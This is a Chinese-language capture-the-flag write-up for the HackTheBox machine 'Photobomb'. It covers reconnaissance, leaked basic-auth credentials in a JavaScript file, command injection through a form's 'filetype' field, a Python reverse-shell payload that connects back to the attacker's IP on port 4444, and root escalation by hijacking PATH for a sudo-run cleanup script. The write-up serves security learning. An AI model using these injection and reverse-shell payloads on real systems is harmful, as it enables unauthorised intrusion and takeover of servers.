### 一、信息收集
1. nmap端口扫描
```shell
    nmap -A 10.10.11.182
    # 经探测，存在22、80端口
    # 进行虚拟主机和目录探测都没有有用信息
    # 出现web应用程序的域名：photobomb.htb
```
访问web页面
<img decoding="async" src="./images/Photobomb.png" >

2. 敏感信息收集
- 点击链接：发现使用basic验证服务，暂时没有密码
- 查看源代码
```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```
> 发现脚本<script src="photobomb.js"></script>，并进行访问
```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
//  pH0t0:b0Mb! 为用户和密码
```
> 使用该用户和密码登录链接跳转到图片下载页面

<img decoding="async" src="./images/Photobomb1.png" >

3. 使用Burb Suit查看请求包
```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 6666666666OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg&dimensions=3000x2000
--  出现三个字段可能存在注入
```

### 二、漏洞发现
1. 本地启动web服务
> python3 -m http.server 5000

2. 更改请求包
```shell
photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg;curl+10.10.16.17:5000&dimensions=3000x2000
# curl+10.10.16.17:5000 验证是否可以访问本地服务，如果可以就能反弹shell
```
> 经过验证，确实可以访问本地服务，因此确定存在漏洞


### 三、漏洞利用
1. 生成反弹shell的payload
```shell
export+RHOST="10.10.16.17";export+RPORT=4444;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in(0,1,2)];pty.spawn("/bin/bash")'
```

2. 本地启动端口监听
> nc -lvnp 4444

3. 获得webshell
```shell
photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg;export+RHOST="10.10.16.17";export+RPORT=4444;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in(0,1,2)];pty.spawn("/bin/bash")'&dimensions=3000x2000
# 上传该payload既可以拿到webshell
```

### 四、权限提升
1. 寻找可以使用的SUID文件
```shell
# 执行语句
find . -perm /4000

# 文件范围，没有找到可以使用的
usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
```

2. 在opt目录发现日志清除脚本:/opt/cleanup.sh  
```shell
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

### find脚本使用相对路径
```

3. 提权
```shell
echo "/bin/bash" > find
chmod +x find 
sudo PATH=$PWD:$PATH /opt/cleanup.sh  
```


